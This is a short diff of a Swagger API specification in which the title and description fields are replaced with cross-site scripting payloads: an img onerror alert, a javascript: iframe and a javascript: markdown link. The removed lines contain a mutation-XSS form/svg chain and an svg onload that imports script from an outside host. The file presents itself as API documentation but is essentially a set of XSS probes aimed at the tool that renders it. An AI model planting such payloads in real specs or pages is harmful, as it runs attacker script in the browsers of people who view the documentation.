@@ -1,10 +1,9 @@
 swagger: '2.0'
 info:
-  title: Classic API Resource Documentation
+  title: "<img src=x onerror=alert('XCYBOY')>"
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
-    <svg/ONload=import('//X55.is')><xss id=x tabindex=1 onfocus=alert()><svg/onload=top >
-
+    <iframe src="javascript:alert('XCYBOY')"></iframe>
+ [Click me](javascript:alert('XCYBOY'))
   version: production
 basePath: /JSSResource/
 produces:
